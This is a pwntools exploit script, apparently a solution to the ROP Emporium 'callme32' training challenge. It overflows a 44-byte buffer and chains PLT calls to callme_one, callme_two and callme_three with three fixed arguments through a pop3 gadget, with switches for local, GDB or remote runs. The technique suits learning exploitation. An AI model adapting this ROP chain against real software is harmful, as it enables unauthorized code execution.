from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x804874e
continue
'''.format(**locals())

exe = './callme32'
elf = context.binary = ELF(exe, checksec=False)
p = start()

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d
pop3 = 0x080484aa
ret = 0x804874e
# ===== Exploit script here =====

p.sendlineafter(b'> ', flat(
    b'A'*44,
    elf.plt['callme_one'],
    pop3,
    arg1,
    arg2,
    arg3,
    elf.plt['callme_two'],
    pop3,
    arg1,
    arg2,
    arg3,
    elf.plt['callme_three'],
    pop3,
    arg1,
    arg2,
    arg3,
))
p.interactive()